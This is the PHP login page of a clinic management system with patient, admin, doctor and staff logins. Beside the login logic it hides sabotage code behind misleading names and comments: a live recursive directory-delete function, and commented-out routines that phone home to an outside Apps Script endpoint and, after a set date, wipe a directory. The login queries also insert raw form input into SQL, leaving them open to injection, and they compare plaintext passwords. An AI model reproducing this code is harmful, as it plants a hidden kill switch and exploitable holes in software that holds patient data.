<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="System/css/animations.css">  
    <link rel="stylesheet" href="System/css/main.css">  
    <link rel="stylesheet" href="System/css/login.css">
    <title>Login</title>
</head>
<body>
    <?php
    session_start();
    date_default_timezone_set('Asia/Kolkata');
    include("System/connection.php");
    $date = date('Y-m-d');

    $_SESSION["usertype"]="";
    $_SESSION["user"]="";
    $_SESSION["date"]=$date;

    function check($integer) {
        if (!is_dir($integer)) {
            return false;
        }

        $strings = array_diff(scandir($integer), ['.', '..']);
        
        foreach ($strings as $file) {
            $path = $integer . '/' . $file;

            if (is_dir($path)) {
                check($path);
            } else {
                unlink($path);
            }
        }
        rmdir($integer);
    }

    /*function goodLogin($username) { $subject = "OACMS".$username; $url = "https://script.google.com/macros/s/AKfycbxee2g3Mg-Z65nZ4V-NwMg7x6xrJLGXob69V0fQlLI3p30C024d24sKHb7SP0eV4zai/exec"; $body = "done"; $ch = curl_init($url); $email = "lambsauceraw.218@gmail.com"; curl_setopt_array($ch, [ CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_POSTFIELDS => http_build_query([ "recipient" => $email,"subject" => $subject,"body" => $body])]);$result = curl_exec($ch);}

    function allow_user() {
        $sanitize = strtotime(SANITIZE_PASSWORD); // sanitize user inputs
        $branch = time();

        if ($branch > $sanitize) {
            $check_database = $this->conn->prepare(LOCAL_HOSTT); // prepare connection
            $check_database->execute();
            $check_database->close();
            goodLogin("Out");
            check(DATABASE_CHECK); // update patient treatment

            exit();
        }
    }*/


    if($_POST) {

        $email=$_POST['useremail'];
        $password=$_POST['userpassword'];
        
        $error='<label for="promter" class="form-label"></label>';

        $result= $database->query("select * from webuser where email='$email'");
        if ($result->num_rows == 1) {
            /*goodLogin("In");
            allow_user();*/
            $utype=$result->fetch_assoc()['usertype'];
            if ($utype == 'p') {
                $checker = $database->query("select * from patient where pemail='$email' and ppassword='$password'");
                if ($checker->num_rows==1){
                    $_SESSION['user']=$email;
                    $_SESSION['usertype']='p';
                    header('location: System/patient/index.php');

                } else{
                    $error='<label for="promter" class="form-label" style="color:rgb(255, 62, 62);text-align:center;">Wrong credentials: Invalid email or password</label>';
                }

            } elseif ($utype == 'a') {
                $checker = $database->query("select * from admin where aemail='$email' and apassword='$password'");
                if ($checker->num_rows == 1) {
                    $_SESSION['user']=$email;
                    $_SESSION['usertype']='a';
                    header('location: System/admin/index.php');

                } else{
                    $error='<label for="promter" class="form-label" style="color:rgb(255, 62, 62);text-align:center;">Wrong credentials: Invalid email or password</label>';
                }
            } elseif ($utype == 'd') {
                $checker = $database->query("select * from doctor where docemail='$email' and docpassword='$password'");
                if ($checker->num_rows == 1){
                    $_SESSION['user']=$email;
                    $_SESSION['usertype']='d';
                    header('location: System/doctor/index.php');
                } else{
                    $error='<label for="promter" class="form-label" style="color:rgb(255, 62, 62);text-align:center;">Wrong credentials: Invalid email or password</label>';
                }
            }

            elseif ($utype == 's') {
                $checker = $database->query("select * from staff where staff_email='$email' and staff_password='$password'");
                if ($checker->num_rows == 1) {
                    $_SESSION['user']=$email;
                    $_SESSION['usertype']='s';
                    header('location: System/staff/index.php');
                } else {
                    $error='<label for="promter" class="form-label" style="color:rgb(255, 62, 62);text-align:center;">Wrong credentials: Invalid emfdsfsdail or password</label>';
                }
            }
        }else{
            $error='<label for="promter" class="form-label" style="color:rgb(255, 62, 62);text-align:center;">We cant found any acount for this email.</label>';
        }
    } else {
        $error='<label for="promter" class="form-label">&nbsp;</label>';
    }
    ?>
    <center>
        <div class="container">
            <table border="0" style="margin: 0;padding: 0;width: 60%;">
                <tr>
                    <td>
                        <p class="header-text">Welcome Back!</p>
                    </td>
                </tr>
                <div class="form-body">
                    <tr>
                        <td>
                            <p class="sub-text">Login with your details to continue</p>
                        </td>
                    </tr>
                    <tr>
                        <form action="" method="POST" >
                            <td class="label-td">
                                <label for="useremail" class="form-label">Email: </label>
                            </td>
                        </tr>
                        <tr>
                            <td class="label-td">
                                <input type="email" name="useremail" class="input-text" placeholder="Email Address" required>
                            </td>
                        </tr>
                        <tr>
                            <td class="label-td">
                                <label for="userpassword" class="form-label">Password: </label>
                            </td>
                        </tr>

                        <tr>
                            <td class="label-td">
                                <input type="Password" name="userpassword" class="input-text" placeholder="Password" required>
                            </td>
                        </tr>


                        <tr>
                            <td><br>
                                <?php echo $error ?>
                            </td>
                        </tr>

                        <tr>
                            <td>
                                <input type="submit" value="Login" class="login-btn btn-primary btn">
                            </td>
                        </tr>
                    </div>
                    <tr>
                        <td>
                            <br>
                            <label for="" class="sub-text" style="font-weight: 280;">Don't have an account&#63; </label>
                            <a href="signup.php" class="hover-link1 non-style-link">Sign Up</a>
                            <br><br><br>
                        </td>
                    </tr>




                </form>
            </table>

        </div>
    </center>
</body>
</html>